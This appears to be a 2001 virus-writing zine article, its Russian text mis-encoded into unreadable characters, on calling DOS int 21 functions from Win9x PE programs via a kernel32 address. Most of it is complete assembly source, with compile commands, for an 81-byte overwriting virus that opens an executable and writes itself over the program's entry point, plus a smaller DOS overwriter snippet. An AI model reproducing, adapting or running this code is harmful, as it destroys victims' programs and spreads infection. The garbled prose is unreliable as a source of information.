
                _____ _____     ___
    _,ฺ\/ฟ  :ฐ  :ฐ     :ฐ ึ social distortion all about vx-scene ท
 ,4\ู"``"ู  ll  l`     ll  ::;;;::;;....  ....:;..: ::...;.:;;;:;
:ฐ(_          |    ___    ll ._
 `ภ/|ณS|/ฟ,_ |`ฺ\ำ"ฝ/:: |ึ,._  ๋งฎข int 21 จง PE [2001]
_____ ``^"ภ/L, d7ู` ___  7l:;%%|.$|
$$$$|_ | `7;?( |asd| :: |$$$|$| by smart [m_youth]
$$$$|/ฺ,.__,ฺ\:`4ณ/ฟ,_  _ll  ``''""ูู
$$$$|`ภ/|ณณ|\ู`   `ภ/ณ:


                         ๋งฎข int 21 จง PE EXE.
                         ~~~~~~~~~~~~~~~~~~~~~~~
    DOS ญฅ ใฌฅเ ! ง PE EXE ฌฎฆญฎ ฏฎซงฎขโ์แ๏ คฎแฎขแชจฌ int 21, จซจ, โฎ็ญฅฅ,
 ฅฃฎ จฌจโๆจฅฉ. kernel32.dll ฅแโ์ แฅเขจแ คซ๏ เกฎโ๋ แ คฎแฎขแชจฌจ ไใญชๆจ๏ฌจ,
 เแฏฎซฎฆฅญญ๋ฉ ฏฎ คเฅแใ 0bff712b9h  แฎฆซฅญจ๎, ฎญ ฏฎคคฅเฆจขฅโ ญฅ ขแฅ ไใญช-
 ๆจจ, ญฎ แฌ๋ฅ ญฅฎกๅฎคจฌ๋ฅ (โฎ ฅแโ์ คซ๏ เกฎโ๋ แ ไฉซฌจ)  จฌฅ๎โแ๏.  ฎซญ๋ฉ
 แฏจแฎช ขแฅๅ ฏฎคคฅเฆจขฅฌ๋ๅ ไใญชๆจฉ - ข ชฎญๆฅ แโโ์จ.

    ๋ง๋ขโ์ ํโฎโ int 21 ฌฎฆญฎ ญฅแชฎซ์ชจฌจ แฏฎแฎกฌจ:

1) คฅซข ฎโคฅซ์ญใ๎ ฏเฎๆฅคใเใ:

       call    int21
        ...
int21: push    esi
       mov     esi,0bff712b9h
       call    esi
       pop     esi
       ret

2) ฅเฅง ฌชเฎแ (ฌฅญฅฅ ฏเฅคฏฎ็โจโฅซ์ญฎ, โ.ช. ญฅํชฎญฎฌญฎ, ญฎ โชฎฉ แฏฎแฎก
   ขแโเฅ็ฅโแ๏ คฎขฎซ์ญฎ ็แโฎ):

       int21   macro
       push    esi
       mov     esi,0bff712b9h
       call    esi
       pop     esi
       endm

3) แซจ ฅแโ์ ญฅจแฏฎซ์งใฅฌ๋ฉ เฅฃจแโเ, (ญฏเจฌฅเ edi):

       mov     edi,0bff712b9h
       ...
       mov     ah,3eh
       call    edi   ; int 21h/close file

   โฎโ แฏฎแฎก ฏฎงขฎซ๏ฅโ แํชฎญฎฌจโ์ ฌฅแโฎ, โ.ช. จญแโเใชๆจ๏ call edi งญจฌฅโ
ขแฅฃฎ คข กฉโ.
    ช็ฅแโขฅ ฏเจฌฅเ กใคฅโ ฌฎ๏ ฏฎฏ๋โช ญฏจแญจ๏ แฌฎฃฎ ชฎเฎโชฎฃฎ ขจเ๏ ฏฎค
ring3. โฎโ ขจเใแ ฏเฅคแโขซ๏ฅโ แฎกฎฉ ฎขฅเขเฉโฅเ คซจญฎฉ ข 81 กฉโ แฎ แซฅคใ-
๎้จฌจ ฎฃเญจ็ฅญจ๏ฌจ:
  ข กใไฅเฅ ฏฎ คเฅแใ edx คฎซฆญฎ ก๋โ์ ชชฎฅ-ญจกใค์ จฌ๏ exe่ญจช
  จฌ๏ ํโฎฃฎ exe่ญจช คฎซฆญฎ ญ็จญโ์แ๏ แ 'C:'
    ํโฎฌ ขจเใแฅ จแฏฎซ์งฎขซจแ์ ญฅชฎโฎเ๋ฅ จคฅจ จง ขจเใแ w95.espore by henky,
ข ็แโญฎแโจ ฏฎจแช จฌ๑ญ ไฉซฎข ข ชฅ่ฅ.

ฤฤฤฤด cut here รฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
; Name:       Win9x.TinyR3.81
; Autor:      smart / Misdirected_Youth_All-Start
; Stuff used: source of W95.Espore.140 by Henky/29A
;             Matt Pietrek "Unautorised windows"
; Compile:    tasm32 /M /ML /Z kernel32.asm
;             tlink32 /Tpe /aa /c /x /r kernel32,,, import32

    .586p
    .model flat,stdcall

  TRUE = 1
  FALSE = 0
  DEBUG = TRUE
  Extrn MessageBoxA : proc

dataseg
     box_name db 'Virus',0
codeseg
      ออออออออออออออออออออออออหอออออออออหออออออออออออออออออออออออออออออออออป
start:mov     esi,0bff712b9h ;บ 5 กฉโ  บ คเฅแ ชฅเญฅซฎขแชฎฃฎ int 21       บ
      ออออออออออออออออออออออออฮอออออออออฮออออออออออออออออออออออออออออออออออน
      mov     edi,0c1000000h ;บ 5 กฉโ  บ ํโฎโ คเฅแ คฎแโใฏฅญ คซ๏ งฏจแจ - บ
                             ;บ         บ จแฏฎซ์งใฅฌ ฅฃฎ ชช กใไฅเ         บ
      ออออออออออออออออออออออออฮอออออออออฮออออออออออออออออออออออออออออออออออน
ฺฤฤฤฤ push    eax            ;บ 1 กฉโ  บ eax = entrypoint offset          บ
ณ     ออออออออออออออออออออออออฮอออออออออฮออออออออออออออออออออออออออออออออออน
ณ a1: inc     edx            ;บ 1 กฉโ  บ ฏเฅคฏฎซฃฅฌ, ็โฎ ข กใไฅเฅ ฏฎ    บ
ณ     ออออออออออออออออออออออออฮอออออออออน; ฏฎ คเฅแใ edx แฎคฅเฆโแ๏ จฌฅญ  บ
ณ     cmp word ptr [edx],':C';บ 5 กฉโ  บ ไฉซฎข. แซจ จๅ โฌ ญฅ ฎชฆฅโแ๏, บ
ณ     ออออออออออออออออออออออออฮอออออออออน;โฎ ฏฎซใ็ฅฌ งขจแญจฅ. คฅแ์ ฌ๋  บ
ณ     je      a2             ;บ 2 กฉโ บ จงกขซ๏ฅฌแ๏ ฎโ จญแโเใชๆจจ        บ
ณ     ออออออออออออออออออออออออฮอออออออออน;mov ecx,็โฎโฎ_โฌ , โ.ช. ข ecx   บ
ณ     loop    a1             ;บ 2 กฉโ บ ใฆฅ ฅแโ์ ญฅฎกๅฎคจฌฎฅ งญ็ฅญจฅ.   บ
ณ     ออออออออออออออออออออออออสอออออออออสอออออออออหออออออออออออออออออออออออน
ณa2: IF DEBUG                                     บ;ข๋ขฎคจฌ จฌ๏ งเฆฅฌฎฃฎบ
ณ     pushad                                      บ;ไฉซ                  บ
ณ     call    MessageBoxA,0,edx,offset box_name,0 บ                        บ
ณ     popad                                       บ                        บ
ณ    ENDIF                                        บ                        บ
ณ     ออออออออออออออออออออออออหอออออออออหอออออออออสออออออออออออออออออออออออน
ณ     mov     ax,3d02h       ;บ 4 กฉโ บ  ฎโชเ๋ขฅฌ ญ งฏจแ์ ญฉคฅญญ๋ฉ   บ
ณ     ออออออออออออออออออออออออฮอออออออออน; ไฉซ จ ฏฎซใ็ฅฌ ฅฃฎ ๅฅญคซ       บ
ณ     call    esi            ;บ 2 กฉโ บ                                  บ
ณ     ออออออออออออออออออออออออฮอออออออออน                                  บ
ณ     jnc     a3             ;บ 2 กฉโ บ; โ.ช. ข ชํ่ฅ ฌฎฆฅโ ฎชงโ์แ๏ จฌ๏ บ
ณ     ออออออออออออออออออออออออฮอออออออออน; ไฉซ, งฏจแ์ ข ชฎโฎเ๋ฉ ญฅ ขฎง- บ
ณ     pop     eax            ;บ 1 กฉโ  บ; ฌฎฆญ (ฎก๋็ญ๋ฌ แฏฎแฎกฎฌ), โฎ    บ
ณ     ออออออออออออออออออออออออฮอออออออออน; ฏเจค๑โแ๏ ขแโขจโ์ ฏเฎขฅเชใ      บ
ณ     ret                    ;บ 1 กฉโ  บ;                                 บ
ณ     ออออออออออออออออออออออออฮอออออออออน                                  บ
ณa3:  xchg    ebx,eax        ;บ 1 กฉโ  บ                                  บ
ณ     ออออออออออออออออออออออออฮอออออออออฮออออออออออออออออออออออออออออออออออน
ณ     mov     ax,3f00h       ;บ 4 กฉโ บ                                  บ
ณ     ออออออออออออออออออออออออฮอออออออออน;  แ็จโ๋ขฅฌ MZ-header            บ
ณ ฺฤฤ push    eax            ;บ 1 กฉโ  บ                                  บ
ณ ณ   ออออออออออออออออออออออออฮอออออออออน                                  บ
ณ ณ   push    42h            ;บ 2 กฉโ บ                                  บ
ณ ณ   ออออออออออออออออออออออออฮอออออออออน                                  บ
ณ ณ   pop     ecx            ;บ 1 กฉโ  บ                                  บ
ณ ณ   ออออออออออออออออออออออออฮอออออออออน                                  บ
ณ ณ   mov     edx,edi        ;บ 2 กฉโ บ                                  บ
ณ ณ   ออออออออออออออออออออออออฮอออออออออน                                  บ
ณ ณ   call    esi            ;บ 2 กฉโ บ                                  บ
ณ ณ   ออออออออออออออออออออออออฮอออออออออฮออออออออออออออออออออออออออออออออออน
ณ ณ   mov     edx,[edi+3ch]  ;บ 3 กฉโ บ; ใแโญขซจขฅฌ ใชงโฅซ์ ญ      บ
ณ ณ   ออออออออออออออออออออออออฮอออออออออน; pe header                       บ
ณ ณ   xchg    ah,al          ;บ 2 กฉโ บ                                  บ
ณ ณ   ออออออออออออออออออออออออฮอออออออออน                                  บ
ณ ณ   xor     ecx,ecx        ;บ 2 กฉโ บ                                  บ
ณ ณ   ออออออออออออออออออออออออฮอออออออออน                                  บ
ณ ณ   call    esi            ;บ 2 กฉโ บ                                  บ
ณ ณ   ออออออออออออออออออออออออฮอออออออออฮออออออออออออออออออออออออออออออออออน
ณ ภฤฤ pop     eax            ;บ 1 กฉโ  บ                                  บ
ณ     ออออออออออออออออออออออออฮอออออออออน; แ็จโ๋ขฅฌ pe header             บ
ณ     mov     edx,edi        ;บ 2 กฉโ บ                                  บ
ณ     ออออออออออออออออออออออออฮอออออออออน                                  บ
ณ     push    42h            ;บ 2 กฉโ บ                                  บ
ณ     ออออออออออออออออออออออออฮอออออออออน                                  บ
ณ     pop     ecx            ;บ 1 กฉโ  บ                                  บ
ณ     ออออออออออออออออออออออออฮอออออออออน                                  บ
ณ     call    esi            ;บ 2 กฉโ บ                                  บ
ณ     ออออออออออออออออออออออออฮอออออออออฮออออออออออออออออออออออออออออออออออน
ณ     mov     edx,[edi + 28h];บ 3 กฉโ บ                                  บ
ณ     ออออออออออออออออออออออออฮอออออออออน; ใแโญฎขจฌ ใชงโฅซ์ ญ โฎ็ชใ    บ
ณ     xchg    ah,al          ;บ 2 กฉโ บ ขๅฎค ฏเฎฃเฌฌ๋                  บ
ณ     ออออออออออออออออออออออออฮอออออออออน                                  บ
ณ     xor     ecx,ecx        ;บ 2 กฉโ บ                                  บ
ณ     ออออออออออออออออออออออออฮอออออออออน                                  บ
ณ     call    esi            ;บ 2 กฉโ บ                                  บ
ณ     ออออออออออออออออออออออออฮอออออออออฮออออออออออออออออออออออออออออออออออน
ณ     mov     ax,4000h       ;บ 4 กฉโ บ                                  บ
ณ     ออออออออออออออออออออออออฮอออออออออน; งฏจแ๋ขฅฌ ขจเใแ ฏฎขฅเๅ ชฎค    บ
ภฤฤฤฤฤpop     edx            ;บ 1 กฉโ  บ ฏเฎฃเฌฌ๋                        บ
      ออออออออออออออออออออออออฮอออออออออน                                  บ
      push    eov - start    ;บ 2 กฉโ บ                                  บ
      ออออออออออออออออออออออออฮอออออออออน                                  บ
      pop     ecx            ;บ 1 กฉโ  บ                                  บ
      ออออออออออออออออออออออออฮอออออออออน                                  บ
      call    esi            ;บ 2 กฉโ บ                                  บ
      ออออออออออออออออออออออออฮอออออออออฮออออออออออออออออออออออออออออออออออน
      ret                    ;บ 1 กฉโ  บ; ข๋ๅฎคจฌ จง ฏเฎฃเฌฌ๋            บ
      ออออออออออออออออออออออออสอออออออออสออออออออออออออออออออออออออออออออออผ
                    ; ขแฅฃฎ:    81 กฉโ
eov:
end start

ฤฤฤฤด cut here รฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

  ฎค คฎแ ญฅ็โฎ ฏฎๅฎฆฅฅ งญจฌซฎ 18 กฉโ, ฎกเกโ๋ขซแ๏ ไฉซ, ใชงญญ๋ฉ ข
  ชฎฌญคญฎฉ แโเฎชฅ. ฎโ, ชแโโจ, ํโ งขฅเ๎ฃ (ขโฎเ ญฅจงขฅแโฅญ):

        mov     ah,1ah  ; 2
        mov     dx,si   ; 2
        int     21h     ; 2
        mov     ah,0fh  ; 2
        mov     dx,5ch  ; 3
        int     21h     ; 2
        mov     ah,15   ; 2
        int     21h     ; 2
        ret             ; 1

ฏจแฎช ไใญชๆจฉ คฎแ, ฏฎคคฅเฆจขฅฌ๋ๅ แฅเขจแฎฌ Int21h_Dispatch (ขง๏โฎ จง จโเฅช)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤยฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
ณDOS subfunction     ณ    Purpose                      ณ
รฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤด
ณ      0e00          ณ   Set default drive             ณ
ณ      1900          ณ   Get current drive             ณ
ณ      2a00          ณ   Get system date               ณ
ณ      2b00          ณ   Set system date               ณ
ณ      2c00          ณ   Get system time               ณ
ณ      2d00          ณ   Set system time               ณ
ณ      3600          ณ   Get disk free space           ณ
ณ      3d00          ณ   Open file - read only         ณ
ณ      3d02          ณ   Open file read/write          ณ
ณ      3e00          ณ   Close file                    ณ
ณ      3f00          ณ   Read file                     ณ
ณ      4000          ณ   Write file                    ณ
ณ      4200          ณ   Set current file position     ณ
ณ                    ณ   (relative to start of file)   ณ
ณ      4201          ณ   Set current file position     ณ
ณ                    ณ   (relative to current position)ณ
ณ      4202          ณ   Set current file position     ณ
ณ                    ณ   (relative to end of file)     ณ
ณ      4400          ณ   IOCTL - get device informationณ
ณ      4401          ณ   IOCTL - set device informationณ
ณ      4408          ณ   IOCTL - check if block device ณ
ณ                    ณ   removable                     ณ
ณ      4409          ณ   IOCTL - check if block device ณ
ณ                    ณ   remote                        ณ
ณ      4400          ณ   IOCTL - generic block device  ณ
ณ                    ณ   request                       ณ
ณ      4b00          ณ   Exec program                  ณ
ณ      4d00          ณ   Get return code               ณ
ณ      5000          ณ   Get current PSP               ณ
ณ      5700          ณ   Get file date/time            ณ
ณ      5701          ณ   Set file date/time            ณ
ณ      5704          ณ   Set extended file attributes  ณ
ณ      5705          ณ   ??? Unknown                   ณ
ณ      5706          ณ   ??? Unknown                   ณ
ณ      5707          ณ   ??? Unknown                   ณ
ณ      5900          ณ   Get extended error info       ณ
ณ      5c00          ณ   Lock file region              ณ
ณ      5c01          ณ   Unlock file region            ณ
ณ      5e00          ณ   Network functions             ณ
ณ      5f32          ณ   ??? Unknown                   ณ
ณ      5f33          ณ   ??? Unknown                   ณ
ณ      5f34          ณ   ??? Unknown                   ณ
ณ      5f35          ณ   ??? Unknown                   ณ
ณ      5f36          ณ   ??? Unknown                   ณ
ณ      5f37          ณ   ??? Unknown                   ณ
ณ      5f38          ณ   ??? Unknown                   ณ
ณ      5f4b          ณ   ??? Unknown                   ณ
ณ      5f4c          ณ   ??? Unknown                   ณ
ณ      5f4d          ณ   ??? Unknown                   ณ
ณ      5f4f          ณ   ??? Unknown                   ณ
ณ      5f52          ณ   ??? Unknown                   ณ
ณ      6800          ณ   Commit file                   ณ
ณ      7139          ณ   LFN create directory          ณ
ณ      713a          ณ   LFN remove directory          ณ
ณ      713b          ณ   LFN change directory          ณ
ณ      7141          ณ   LFN delete file               ณ
ณ      7143          ณ   LFN get/set file attributes   ณ
ณ      7147          ณ   LFN get current directory     ณ
ณ      714e          ณ   LFN find first file           ณ
ณ      714f          ณ   LFN find next file            ณ
ณ      7156          ณ   LFN rename file               ณ
ณ      7160          ณ   LFN get canonical filename    ณ
ณ      716c          ณ   LFN extended open/create      ณ
ณ      71a0          ณ   LFN get volume information    ณ
ณ      71a1          ณ   LFN find close                ณ
ณ      71a3          ณ   ??? Unknown                   ณ
ณ      71a4          ณ   ??? Unknown                   ณ
ณ      71a5          ณ   ??? Unknown                   ณ
ณ      71a6          ณ   LFN Get file info by handle   ณ
ณ      71a7          ณ   LFN File time to dos time     ณ
ณ      b400          ณ   ??? Unknown                   ณ
ณ      ea00          ณ   ??? Unknown                   ณ
ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤมฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู

                                (x) 2001 smart, misdirected_youth_all-star